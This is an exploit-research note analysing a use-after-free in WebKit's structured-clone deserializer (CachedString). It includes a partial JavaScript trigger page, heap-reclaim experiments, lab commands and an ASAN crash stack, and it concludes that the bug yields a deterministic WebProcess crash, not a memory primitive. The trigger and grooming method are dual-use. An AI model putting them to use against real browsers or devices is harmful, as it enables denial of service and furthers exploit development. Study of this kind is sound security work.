# docs/76 — CachedString: replaying the `docs/65` reclaim method, and the cell class that closes it

The action (`GOAL.md`, first item): replay the `docs/65` reclaim technique on the `CachedString` bug (`docs/62`,
`docs/63`) — read the free site and the exact tail in the drop, find a field of the freed object that is read
*after* the free, then place one byte at that offset plus a one-byte control and one allocation control; if the
tail turns out to be protected, say so with the same evidence standard.

This is that attempt. The answer is a **closable wall, measured**: the freed object is a `JSCell` that lives in a
dedicated `IsoSubspace`, so the only cell class that can ever take the slot is another `JSString`, and the only
field read afterwards is an engine-owned `StringImpl*` that JavaScript cannot write. There is no offset at which
the `docs/65` one-byte plant can exist. Two by-products are worth keeping: the structural reason `docs/63`'s
"the occupant is always a string" is not an allocator coincidence, and a **deterministic abort of the
WebProcess** that needs no sanitizer and no reclaim.

## 1. The free site and the tail, from the drop

`CloneDeserializer::CachedString` (`Source/WebCore/bindings/js/SerializedScriptValue.cpp:2819`):

```cpp
    struct CachedString {
        CachedString(const String& string)
            : m_string(string)
        {
        }

        JSValue jsString(JSGlobalObject* lexicalGlobalObject)
        {
            if (!m_jsString)
                m_jsString = JSC::jsString(lexicalGlobalObject->vm(), m_string);
            return m_jsString;
        }
        const String& string() { return m_string; }
        String takeString() { return WTFMove(m_string); }

    private:
        String m_string;
        JSValue m_jsString;
    };
```

`m_jsString` is a raw `JSValue` — no write barrier, no keep-alive — and the pool that owns it is a plain
`Vector<CachedString>` (`:4778`). New strings are appended by `readStringData` (`:3169`: `m_constantPool.append(str)`),
and a repeated string is a `StringPoolTag` + index that re-resolves to the same entry (`:3153-3160`). The two places
that turn an entry back into a JavaScript value are `StringTag` (`:4470-4474`) and `StringObjectTag` (`:4479-4483`).

The drop is a **half backport** of upstream's fix. `CloneSerializer` *does* have
`MarkedArgumentBuffer m_keepAliveBuffer` (`:2487`) and appends map/set iterators to it (`:2646`, `:2668`, `:2692`);
`CloneDeserializer` has no such buffer and `CachedString::jsString()` appends nothing. Upstream `442482ad` moved that
buffer up into `CloneBase` and added exactly the missing append.

**The free is the collector's, not a program statement.** `destroyFunc` for the cell is followed by a zap
(`Source/JavaScriptCore/heap/MarkedBlockInlines.h:255`):

```cpp
    auto destroy = [&] (void* cell) {
        JSCell* jsCell = static_cast<JSCell*>(cell);
        if (!jsCell->isZapped()) {
            destroyFunc(vm, jsCell);
            jsCell->zap(HeapCell::Destruction);
        }
    };
```

and `zap()` (`Source/JavaScriptCore/heap/HeapCell.h:54`) is:

```cpp
    void zap(ZapReason reason)
    {
        uint32_t* cellWords = bitwise_cast<uint32_t*>(this);
        cellWords[0] = 0;
        // Leaving cellWords[1] alone for crash analysis if needed.
        cellWords[2] = reason;
    }
    bool isZapped() const { return !*bitwise_cast<const uint32_t*>(this); }
```

So the fields the engine reads after the free are exactly these three words:

* bytes 0-3 (`m_structureID`) = **0** — `isZapped()` is true, which is the only reason the oracle's `jsCast`
  security assert fires (§5);
* bytes 4-7 (`m_indexingTypeAndMisc`, `m_type`, `m_flags`, `m_cellState`) are **left alone**, so `m_type` still
  says `String`: `JSValue::isString()` remains true on a freed cell;
* bytes 8-15 (`m_value`, the `String` = `StringImpl*`) become `(high 32 bits of the old impl pointer) | 1`,
  because `cellWords[2]` — the low half of `m_value` — is overwritten with the zap reason.

The `String` in the pool entry (`m_string`) keeps the `StringImpl` itself alive, so the characters are never freed;
only the 16-byte cell is. That is why `docs/62` read a *valid but wrong* string rather than garbage.

## 2. Why only a `JSString` can take the cell

`JSString` allocates from its own subspace, and that subspace is an **`IsoSubspace`**:

```cpp
// Source/JavaScriptCore/runtime/JSString.h:118-124
    // We specialize the string subspace to get the fastest possible sweep. This wouldn't be
    // necessary if JSString didn't have a destructor.
    template<typename, SubspaceAccess>
    static GCClient::IsoSubspace* subspaceFor(VM& vm)
    {
        return &vm.stringSpace();
    }
```

```cpp
// Source/JavaScriptCore/heap/Heap.h:113,138,1012-1015
#define FOR_EACH_JSC_COMMON_ISO_SUBSPACE(v) \
    ...
    v(stringSpace, stringHeapCellType, JSString) \

#define DECLARE_ISO_SUBSPACE(name, heapCellType, type) \
    IsoSubspace name;

    FOR_EACH_JSC_ISO_SUBSPACE(DECLARE_ISO_SUBSPACE)
```

`IsoSubspace` blocks are not shared with the generic size-class subspace. A plain object is not iso-allocated:

```cpp
// Source/JavaScriptCore/runtime/JSObjectInlines.h:43-47
CompleteSubspace* JSFinalObject::subspaceFor(VM& vm)
{
    static_assert(!CellType::needsDestruction);
    return &vm.cellSpace();
}
```

and a `{}` literal really is the same 16-byte size class as a `JSString`: every object literal is emitted with
inline capacity **0** (`BytecodeGenerator.cpp:3199`: `OpNewObject::emit(this, dst, 0)`), and
`JSFinalObject::allocationSize(0)` is `sizeof(JSObject)` = `sizeof(JSCell)` + one `Butterfly*`
(`JSObject.h:1238-1241`, `:1191`) = 8 + 8 = **16 bytes**.

One correction to a natural assumption: an `ObjectTag` that comes *from the stream* is **64 bytes**, not 16,
because the deserializer builds it with `constructEmptyObject(m_lexicalGlobalObject, m_globalObject->objectPrototype())`
(`SerializedScriptValue.cpp:4891`), which uses `JSFinalObject::defaultInlineCapacity` = 6 (`ObjectConstructor.h:74-77`,
`JSObject.h:1246-1248`). So a stream-fed object flood is a *different size class* control; the same-size-class probe
has to be a page-side `{}` literal (§4, arm `pre=lit`).

## 3. The page

`research/cachedstring/class-wall.html` (md5 `8bba4a1190665f9a67830b1882dfaa99`), knobs in the query string.
The shape is one `Map`, one getter, and one numeric-keyed array:

```js
  var S = 'Expected result';
  var map = new Map();
  map.set('free', S);        // pool: 'free'=0, S=1
  map.set('expected', 0);    // pool: 'expected'=2  (so the later re-add is a pool ref, no JSString)
  map.set('tmp', { get a () {
      map.delete('free');
      if (FREEK) map.set('free', 0x1234);   // J_S loses its only root here; the next GC sweeps it
      map.delete('expected');               // re-added below, after the window
      var arr = [];
      // ... flood, see knobs ...
      for (var i = 0; i < NBUF; i++) arr.push(new ArrayBuffer(BUFMB * 1024 * 1024)); // GC inside the window
      // ... flood, see knobs ...
      map.set(7, arr);                      // numeric key: no JSString allocated before the value
      map.set('expected', S);               // pool ref 1 -> the stale m_jsString
      return 1;
  }});
```

The getter runs during **serialisation**; `map.set('free', 0x1234)` is serialised as an entry *after* the getter,
so during deserialisation it overwrites the map value that was the cached string's only root. The `ArrayBuffer`
elements that follow force the GC inside the same deserialisation, and the `map.set('expected', S)` entry is a
`StringPoolTag` back to pool index 1 — the stale `m_jsString`. The re-add of `'expected'` is a pool reference as
well, so no key `JSString` is allocated between the sweep and the reuse.

After the clone, the page reads the value *first* and reports numbers only:

```js
  got = r.get('expected');
  t = typeof got;  same = (got === S);  L = got.length;  C = got.charCodeAt(0);
  // then: B('RESULT typeof=' + t + ' same=' + same + ' idSame=' + idSame + ' L=' + L + ' C=' + C + ' v=' + v);
```

`idSame` is `got === r.get(7)[NBUF]`, i.e. equality with the first flood element. (In JSC `===` on two strings is
a **content** comparison, so `idSame` is content-level; the cell-level claim rests on `L`/`C`/`v` plus the fact
that the stale pointer is a cell address in `stringSpace`, not on `===`.)

## 4. The runs

Harness, unchanged: `pkill -f "[h]ttp.server $PORT"`, page served from `/tmp/wkp`, a fresh port per arm, quarantine
**off** via `run_nq.sh` unless stated, scored from the beacon log. The runner is `research/cachedstring/runs.sh`
(copied to `/tmp/wkp/runs.sh`); it must run inside the `wk` distrobox because the ASAN binary needs its `libasan`:

```
ssh teo@<lab-ip> 'cd /home/<user>/wk && distrobox enter wk -- env SECS=18 /tmp/wkp/runs.sh \
  "M1 9951 flood=none&n=0" "M2 9952 flood=none&n=0" "M3 9953 flood=str&n=64" \
  "M4 9954 flood=str&n=64" "M5 9955 flood=obj&n=2000"'
```

All ten arms below are the **same page revision** and differ in one knob each:

| arm | `flood` | knob changed | beacons / report | verdict |
|---|---|---|---|---|
| M1 | — | — | `AddressSanitizer: ABRT ...` | abort |
| M2 | — | — | `AddressSanitizer: ABRT ...` | abort |
| M3 | 64 × `'FL1000..'` | cell class = JSString | `RESULT typeof=string same=false idSame=true L=6 C=70 v=FL1000` | **reclaimed, in the window** |
| M4 | 64 × `'FL1000..'` | repeat | same as M3 | **reclaimed** |
| M5 | 2000 × `{}` from the stream | cell class = JSFinalObject (64 B) | `AddressSanitizer: ABRT ...` | not taken |
| M6 | 64 × `[j]` | cell class = array (different size) | `AddressSanitizer: ABRT ...` | not taken |
| M7 | — | `pre=lit`: one 16-byte `{}` literal after the clone | `AddressSanitizer: ABRT ...` | **not taken at the same size class** |
| M8 | 64 × strings | `freek=0` (no free) | `RESULT typeof=string same=true idSame=false L=15 C=69 v=Expected res` | value intact |
| M9 | — | `nbuf=0` (no GC) | `RESULT typeof=string same=true idSame=false L=15 C=69 v=Expected res` | value intact |
| M10 | 64 × strings | `order=pre` (flood before the buffers) | `AddressSanitizer: ABRT ...` | not taken |

Earlier revisions of the same page agreed and added repetitions, counted here exactly as run:

* **no-flood arm** (nothing allocated in the window): 11 runs across revisions — `C1` abort, `E1`/`E2` **no abort**
  (on the v4 revision, where the page allocated two strings between the clone and the read; the value read was an
  unrelated live `JSString`, lengths 2 and 3), `G1`-`G7` 7/7 abort, and `M1`/`M2` 2/2 abort on the final revision.
  With the same-size-class literal added (`pre=lit`) the final revision is 4/4 abort (`L1`-`L3`, `M7`).
* **string flood**: 13 runs, every one `idSame=true` with `L=6` and `C=70` (the length and first character of
  `FL1000`) — `B2`, `C3`, `E3`, `F1`-`F5`, `J1` (quarantine **on**), `J3`/`J4` (`n=2000`), `M3`/`M4`; eleven of the
  thirteen also print `v=FL1000` outright (the two earliest runs predate that field).
* **object flood**: `D1` (64, abort), `D2` (2000, abort), `H1`-`H3` (2000, 3/3 abort), `M5` (2000, abort).
* **array flood**: `D3`, `M6` (2/2 abort).
* **window-order control** (`order=pre`): `E4`, `I4`, `I5`, `M10` (4/4 abort).
* **free/GC controls**: `C2`, `C4`, `I1`, `I2`, `M8` (`freek=0`) and `D4`, `I3`, `M9` (`nbuf=0`) — value intact,
  `L=15`, `C=69` in every one.

Two things about the flood are worth stating precisely:

* **The first flood string wins, not the last.** `n=64`, `n=2000` and `n=2000` again all report `v=FL1000`, i.e. the
  *first* string element after the buffers takes the slot, which is what "the sweep happened during the buffers and
  the next same-class allocation takes the cell" predicts.
* **The window has an order.** With the same 64 strings placed *before* the buffers (`order=pre`), the slot is not
  taken (M10, `I4`, `I5`): strings allocated before the sweep cannot occupy a cell that is not free yet.

## 5. What the abort is

All abort runs have the same stack (quoted from `data/cachedstring-class/run_M1.log`):

```
AddressSanitizer:DEADLYSIGNAL
==455274==ERROR: AddressSanitizer: ABRT on unknown address 0x03e80006f26a (pc 0x7fa3a02d58a4 ...)
    #3 WTFCrashWithInfoImpl ... /home/<user>/wk/WebKit/Source/WTF/wtf/Assertions.cpp:755
    #5 JSC::reportZappedCellAndCrash(JSC::Heap&, JSC::JSCell const*) JSCell.cpp:352
    #6 JSC::JSString* JSC::jsCast<JSC::JSString*, JSC::JSCell>(JSC::JSCell*) JSCast.h:38
    #7 JSC::asString(JSC::JSValue) JSString.h:765
    #8 JSC::JSValue::strictEqualForCells(...) JSCJSValueInlines.h:1327
    #9 JSC::JSValue::strictEqual(...) JSCJSValueInlines.h:1349
    #10 slow_path_stricteq CommonSlowPaths.cpp:364
    #11 llint_op_stricteq ...
SUMMARY: AddressSanitizer: ABRT ... in __pthread_kill_implementation
** (MiniBrowser:455274): WARNING **: WebProcess CRASHED
```

That is JSC's own freed-cell detector: `jsCast` checks `inherits(JSString::info())`, a zapped cell has
`m_structureID == 0`, and the check calls `reportZappedCellAndCrash`. Reaching it is itself the proof that
`zap()` leaves bytes 4-7 alone: `strictEqualForCells` only calls `asString` on a value whose type byte still says
`String`, so `m_type` survived and only `m_structureID` was cleared. The check is compiled only under

```cpp
// Source/JavaScriptCore/runtime/JSCast.h:33-41
#if (ASSERT_ENABLED || ENABLE(SECURITY_ASSERTIONS)) && CPU(X86_64)
    if (from && !from->JSCell::inherits(std::remove_pointer<To>::type::info()))
        reportZappedCellAndCrash(*from->JSCell::heap(), from);
#else
    ASSERT_WITH_SECURITY_IMPLICATION(!from || from->JSCell::inherits(std::remove_pointer<To>::type::info()));
#endif
```

so on the console (release, no security assertions) the `static_cast` proceeds, `JSString::length()`/`equal()` read
`m_value` = `(old impl high 32 bits) | 1`, and the predicted outcome is a SEGV at an unmappable address, not a
report. **That is a prediction, not a measurement** — the console WebProcess is still wedged by the Guide app
(`GOAL.md`), so this arm cannot be run on hardware yet. What *is* measured is the oracle's abort, and the
counter-case: in the earlier revisions that allocated strings between the clone and the read, the cell had already
been handed to an unrelated live `JSString` (`E1`/`E2` on v4, lengths 2 and 3, first chars `e` and `l`; `B1` on v2,
a page-side beacon string), i.e. when nothing else reclaims the cell first, the page's own next string does.

## 6. Verdict

* The `docs/65` method **cannot be replayed here**, and not because of a `Ref`: the freed object is a `JSCell` in
  `stringSpace`, an `IsoSubspace` whose only cell type is `JSString` — measured at the same 16-byte size class as a
  page `{}` literal (M7) and at 64 bytes from the stream (M5), with a different size class as a third control (M6).
* The only reclaim that exists is **same-type**: another `JSString`, deterministically the first post-sweep one
  (13 runs in total, `L=6`, `C=70`, `v=FL1000` in 11). Its `m_value` is an engine-owned `StringImpl` that the
  deserializer keeps alive; no byte of the reclaimed cell is attacker-writable, so there is no one-byte plant and no
  pointer we choose.
* Therefore `docs/62`/`63` were right that this is string substitution and not an OOB read, and `docs/63`'s
  explanation ("a key is always allocated first") is superseded: the reason is the **subspace**, which is why 2000
  objects and a page literal both fail to take the cell while a single string takes it every time.
* What the bug *does* give, with no sanitizer and no reclaim, is a **deterministic WebProcess abort** from plain
  JS: `structuredClone` of a map whose getter drops the only root of a cached string, with an `ArrayBuffer` later in
  the same stream. Page md5 `8bba4a1190665f9a67830b1882dfaa99`; on that revision every arm that leaves the slot
  unreclaimed aborts — 2/2 plain, 4/4 with the 16-byte literal — and across revisions the plain no-flood arm
  aborted in 9 of 11 runs (the two exceptions are the v4 revision, quoted in §4).
  It is a second DoS next to the `@page` null deref (`docs/67`), not a primitive.

No stage criterion changes: criterion 1 and 2 still rest on the font-face bug (`docs/65`), criterion 3 is still
unmet, and the candidate list still has no second memory-safety primitive (`docs/67`).

## 7. Logs

`data/cachedstring-class/` — `run_M1.log` (the quoted abort), `run_M3.log` (the reclaim), `run_M8.log`,
`run_M9.log` (the two "value intact" controls), plus the matching `srv*.log` beacon transcripts for M1-M10 and the
G/F/H/I/J series.
